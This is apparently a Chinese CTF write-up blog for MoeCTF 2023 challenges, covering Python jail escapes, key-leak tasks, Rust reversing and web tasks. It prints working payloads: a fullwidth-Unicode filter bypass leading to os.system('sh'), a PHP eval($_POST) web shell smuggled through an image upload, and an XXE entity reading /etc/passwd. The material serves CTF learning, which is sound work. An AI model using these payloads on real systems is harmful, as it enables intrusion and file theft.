+<h2 id="jail-level-3"><a href="#jail-level-3" class="headerlink" title="jail level 3"></a>jail level 3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">BANLIST = [<span class="string">&#x27;breakpoint&#x27;</span>]</span><br><span class="line">BANLIST_WORDS = <span class="string">&#x27;|&#x27;</span>.join(<span class="string">f&#x27;(<span class="subst">&#123;WORD&#125;</span>)&#x27;</span> <span class="keyword">for</span> WORD <span class="keyword">in</span> BANLIST)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> re.findall(BANLIST_WORDS, user_input_data, re.I):</span><br><span class="line">  <span class="keyword">raise</span> Exception(<span class="string">&#x27;Blacklisted word detected! you are hacker!&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Answer result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12647#toc-23">CTF Pyjail 沙箱逃逸绕过合集 - 先知社区 (aliyun.com)</a></p>
+<p>相比较jail1多了一个breakpoint()的过滤，通过网上搜索，我们对于函数名可以使用<strong>Unicode</strong>进行绕过，数字可以使用<em><strong>ord</strong></em>绕过，当然如果他的限制大小是&gt;13的话可以使用</p>
+<blockquote>
+<p>eval(input())</p>
+</blockquote>
+<p>那么我们就可以对其中一个字符进行Unicode编码，然后传送到目标处</p>
+<blockquote>
+<p>输入法的全角输入就是unicode编码</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">breakpｏ<span class="built_in">int</span>()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1igtu8neq2m8.webp"></p>
+<h2 id="jail-level-4"><a href="#jail-level-4" class="headerlink" title="jail level 4"></a>jail level 4</h2><p>python2的沙盒逃逸</p>
+<p>python2：input（） &#x3D; python3：eavl（input（））</p>
+<p>直接一句话就行</p>
+<blockquote>
+<p><strong>import</strong>(“os”).system(“sh”)</p>
+</blockquote>
+<h2 id="jail-level-5"><a href="#jail-level-5" class="headerlink" title="jail level 5"></a>jail level 5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">  not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;&#x27;</span>`bid<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  return any(c in not_allowed for c in s)</span></span><br><span class="line"><span class="string">user_input_data = input(&quot;&gt; &quot;)</span></span><br><span class="line"><span class="string">if func_filter(user_input_data):</span></span><br><span class="line"><span class="string">  print(&quot;Oh hacker! Bye~&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">if not user_input_data.isascii():</span></span><br><span class="line"><span class="string">  print(&quot;Sorry we only ascii for this chall!&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">print(&#x27;</span>Answer result: &#123;&#125;<span class="string">&#x27;.format(eval(user_input_data)))</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="jail-level-6"><a href="#jail-level-6" class="headerlink" title="jail level 6"></a>jail level 6</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">  not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;&quot;&#x27;</span>`bic+<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">  return any(c in not_allowed for c in s)</span></span><br><span class="line"><span class="string">user_input_data = input(&quot;&gt; &quot;)</span></span><br><span class="line"><span class="string">if func_filter(user_input_data):</span></span><br><span class="line"><span class="string">  print(&quot;Oh hacker! Bye~&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">if not user_input_data.isascii():</span></span><br><span class="line"><span class="string">  print(&quot;Sorry we only ascii for this chall!&quot;)</span></span><br><span class="line"><span class="string">  exit(0)</span></span><br><span class="line"><span class="string">print(&#x27;</span>Answer result: &#123;&#125;<span class="string">&#x27;.format(eval(user_input_data)))</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Leak-Level-0"><a href="#Leak-Level-0" class="headerlink" title="Leak Level 0"></a>Leak Level 0</h2><blockquote>
+<p>global ()和 locals ()函数</p>
+<p>使用global ()可以获取Python中的全局变量；</p>
+<p>使用locals ()可以获取Python中的局部变量；</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    fake_key_into_local_but_valid_key_into_remote = <span class="string">&quot;moectfisbestctfhopeyoulikethat&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;| Options: </span></span><br><span class="line"><span class="string">|	[V]uln </span></span><br><span class="line"><span class="string">|	[B]ackdoor&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">      not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;vvvveeee&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">      challenge_choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">      <span class="keyword">if</span> challenge_choice == <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;code &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">9</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> func_filter(code):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! byte~&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">elif</span> challenge_choice == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">        key = <span class="built_in">input</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(key == fake_key_into_local_but_valid_key_into_remote):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Hey Admin,please input your code:&quot;</span>)</span><br><span class="line">          code = <span class="built_in">input</span>(<span class="string">&quot;backdoor &gt;&gt; &quot;</span>)</span><br><span class="line">          <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>基础的泄露题，看到他限制了不能使用函数，且V函数里的code长度不能大于9，</p>
+<p>那么我们已知key是全局变量，那我们首先V然后使用global()函数找到真实的key，然后再用B函数进行一句话RCE</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3xkm16wsss20.png"></p>
+<h2 id="Leak-Level-1"><a href="#Leak-Level-1" class="headerlink" title="Leak Level 1"></a>Leak Level 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">    fake_key_into_local_but_valid_key_into_remote = <span class="string">&quot;moectfisbestctfhopeyoulikethat&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">      not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;moe_dbt&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;| Options: </span></span><br><span class="line"><span class="string">|	[V]uln </span></span><br><span class="line"><span class="string">|	[B]ackdoor&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">      challenge_choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">      <span class="keyword">if</span> challenge_choice == <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;code &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">6</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> func_filter(code):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! byte~&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">elif</span> challenge_choice == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">        key = <span class="built_in">input</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(key == fake_key_into_local_but_vailed_key_into_remote):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Hey Admin,please input your code:&quot;</span>)</span><br><span class="line">          code = <span class="built_in">input</span>(<span class="string">&quot;backdoor &gt;&gt; &quot;</span>)</span><br><span class="line">          <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到第一个限制长度变成了6，而且还是有函数过滤，那么我还是使用unicode编码的方式绕过过滤</p>
+<blockquote>
+<p>输入法的全角输入就是unicode编码</p>
+</blockquote>
+<p>我们使用unicode编码输入一个help()，函数，然后输入__main__，查看全局变量</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4kgd10c9cmc0.webp"></p>
+<p>得到正常的key就可以去愉快的一句话RCE了</p>
+<h2 id="Leak-Level-2"><a href="#Leak-Level-2" class="headerlink" title="Leak Level 2"></a>Leak Level 2</h2><p>和leak1一样的，没过滤help(),直接使用help（）获取key然后获取flag</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.39u5399sj2k0.webp"></p>
+<h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Bluebro/article/details/127161165">pytorch超详细安装教程，Anaconda、PyTorch和PyCharm整套安装流程_pytorch安装-CSDN博客</a></p>
+<p>安装了环境，但东西很新，目前没有很多精力，以后再说</p>
+<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="RUST"><a href="#RUST" class="headerlink" title="RUST"></a>RUST</h2><p>第一次接触rust逆向，安装环境安装了好久，最后发现还是GPT好用</p>
+<p>我们需要安装一个rust的IDA插件，那样会更加直观：IDARustDemangler</p>
+<p>首先下载这个插件前我们需要有RUST环境，有了RUST环境后就可以使用cargo进行编译rs-dml，运行起IDARustDemangler.py</p>
+<p>这里放上两个链接，可以自行下载</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/timetravelthree/IDARustDemangler">timetravelthree&#x2F;IDARustDemangler: Rust Demangler &amp; Normalizer plugin for IDA (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.rust-lang.org/zh-CN/tools/install">安装 Rust - Rust 程序设计语言 (rust-lang.org)</a></p>
+<p>我安装时的误会，安装完成RUST后，rs-dml会让你执行</p>
+<p>cargo build –xxxxx</p>
+<p>这个其实是rs-dml github上的，下载下来后，在那个目录执行那个命令就可以，记得最后要把编译出来的rs-dml添加到环境变量中去</p>
+<p>可以看一下没用插件和用插件之前的区别,很明显他会帮你解散 Rust 函数名称并将其规范化</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4fn9frtsv1u0.png"></p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3h3ka2vwfmw0.webp"></p>
+<p>那么我进行分析就简单了很多，但rust不愧是最安全的语言，基本也看不懂，最后我们在这里发现了异样，他对一个数据进行0x88异或，那么前面正好也有一个数据块，我们猜测既然是异或，那么a&#x3D;b^c，那么c&#x3D;a^b，所以我们直接写脚本进行解密即可</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.epnkcgdi1lk.webp"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=[-<span class="number">27</span>, -<span class="number">25</span>, -<span class="number">19</span>, -<span class="number">21</span>, -<span class="number">4</span>, -<span class="number">18</span>, -<span class="number">13</span>, -<span class="number">38</span>, -<span class="number">3</span>, -<span class="number">5</span>, -<span class="number">4</span>, -<span class="number">41</span>, -<span class="number">6</span>, -<span class="number">19</span>, -<span class="number">2</span>, -<span class="number">41</span>, -<span class="number">1</span>, -<span class="number">31</span>, -<span class="number">28</span>, -<span class="number">28</span>, -<span class="number">41</span>, -<span class="number">22</span>, -<span class="number">19</span>, -<span class="number">41</span>, -<span class="number">23</span>, -<span class="number">1</span>, -<span class="number">18</span>, -<span class="number">3</span>, -<span class="number">71</span>, -<span class="number">11</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]^=<span class="number">0x88</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i]%<span class="number">256</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>1.use parameter: UwU&#x3D;u<br>2.post <strong>form</strong>: Luv&#x3D;u<br>3.use admin character<br>4.request from 127.0.0.1<br>5.use browser ‘MoeBrowser’</p>
+<p>第一个条件和第二个条件直接在hackbar传参，第二个是修改cookie的值，第四个是由本地传输，最后一个是指定浏览器</p>
+<p>X-Forwarded-For: 127.0.0.1<br>user-agent:MoeBrowser<br>Cookie: character&#x3D;admin</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3mxe1lqm8780.webp"></p>
+<h2 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h2><p>直接去源码cttl+f 查找moectf即可</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.2b4by3jjufa.png"></p>
+<h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>一些api说明</p>
+<p>注册 <code>POST /register</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;koito&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>登录 <code>POST /login</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;koito&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>获取flag <code>GET /flag</code></p>
+<p>查询服务状态 <code>GET /status</code></p>
+<p>根据他的提示我们得知，他是先让我们注册，然后登陆上去，登录后可以看可以看到flag的地方</p>
+<p>谷歌的hackbar可以直接解析json的数据，然后post传输过去</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4l3ehlj1qrs0.webp"></p>
+<p>传输过去后我们就已经注册成功了</p>
+<h2 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session = requests.session()</span><br><span class="line">resTest = <span class="string">&#x27;弯道直行，保持这个速度&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="comment"># resTest = &#x27;弯道直行，保持这个速度&#x27;</span></span><br><span class="line">    <span class="comment"># fx = &#123;-1:&#x27;左&#x27;,0:&#x27;直行&#x27;,1:&#x27;右&#x27;&#125;</span></span><br><span class="line">    <span class="comment"># ym = &#123;0:&#x27;松开&#x27;,1:&#x27;保持&#x27;,2:&#x27;全开&#x27;&#125;</span></span><br><span class="line">    url = <span class="string">&#x27;http://localhost:62655/&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;太大&quot;</span> <span class="keyword">in</span> resTest:</span><br><span class="line">        ym = <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;太小&quot;</span> <span class="keyword">in</span> resTest:</span><br><span class="line">        ym = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ym = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;向左&quot;</span> <span class="keyword">in</span> resTest:</span><br><span class="line">        fx = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;向右&quot;</span> <span class="keyword">in</span> resTest:</span><br><span class="line">        fx = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fx = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    myData = &#123;  <span class="comment"># 构造的POST数据</span></span><br><span class="line">        <span class="string">&quot;driver&quot;</span>: <span class="string">&quot;11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;steering_control&quot;</span>: fx,</span><br><span class="line">        <span class="string">&quot;throttle&quot;</span>: ym</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># 发送 POST 请求</span></span><br><span class="line">    response = session.post(url, data=myData)</span><br><span class="line">    content = response.text</span><br><span class="line">    <span class="comment"># 找寻指定字符串</span></span><br><span class="line">    start_index = content.find(<span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;&#x27;</span>)</span><br><span class="line">    end_index = content.find(<span class="string">&quot;&lt;/font&gt;&lt;/h3&gt;&lt;/div&gt;&quot;</span>, start_index)</span><br><span class="line">    <span class="keyword">if</span> start_index != -<span class="number">1</span> <span class="keyword">and</span> end_index != -<span class="number">1</span>:</span><br><span class="line">        resTest = content[start_index + <span class="built_in">len</span>(<span class="string">&#x27;&lt;font color=&quot;red&quot;&gt;&#x27;</span>):end_index].strip()</span><br><span class="line">        <span class="built_in">print</span>(resTest)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;未找到指定的字符串&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;会话数据：&quot;</span>, session.cookies.get_dict())</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># session.cookies.get_dict()可以用于获取当前会话对象中的 cookies 数据，返回一个字典形式的 cookies 数据。</span></span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line">session.close()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2><p>经典的文件上传</p>
+<p>编写一个一句话木马文件，上传到对方的服务器，我们就可以使用蚁剑进行连接对面的后门</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们观察他的源代码，发现他只能上传后缀为png的文件，那我们就把这个文件后缀改为png，然后上传到对方的电脑，但一句话木马通常是php源码的格式，我们要执行他只能上传一个php后缀，所以我们在上传的时候，可以用burp进行抓包，然后修改他的后缀名，直接修改后缀名我们发现他是不可以传到对面的服务器的，那我们就在png的后面直接加上php后缀即可</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6cm88qnam5o0.png"></p>
+<p>我们上传成功后就能看到他还贴心的给了我们地址，那么我直接蚁剑连接即可</p>
+<p>可以在更目录发现flag</p>
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.xy90ifuyfn4.webp"></p>
+<h2 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fengzilin1973/article/details/116355031">浅谈 XXE 漏洞任意文件读取_java xxe读取任意文件-CSDN博客</a></p>
+<p>我们抓包发现了xml，那么我们猜测就是xxe漏洞，直接上网找wp</p>
+<p>任意文件读取</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE xxe [ </span><br><span class="line">&lt;!ELEMENT name ANY &gt; </span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:etc/passwd&quot;</span> &gt;]&gt; </span><br><span class="line">&lt;root&gt; </span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt; </span><br><span class="line">&lt;/root&gt; </span><br></pre></td></tr></table></figure>
+
+<p>我们直接发包的时候发现是不可以，我们需要进行一下url编码才可以</p>
+<p>burp里的情况</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xml_content=&lt;!DOCTYPE xxe [ </span><br><span class="line">&lt;!ELEMENT name ANY &gt; </span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:etc/passwd&quot;</span> &gt;]&gt; </span><br><span class="line">&lt;root&gt; </span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt; </span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.539slc36hjk0.webp"></p>
+<h2 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h2><p>直接扫码器burp爆破</p>
+<p>我们可以先用？id&#x3D;1&#x2F;2&#x2F;3去看看这写页面都是什么，那么我们使用burp进行抓包就可以了</p>
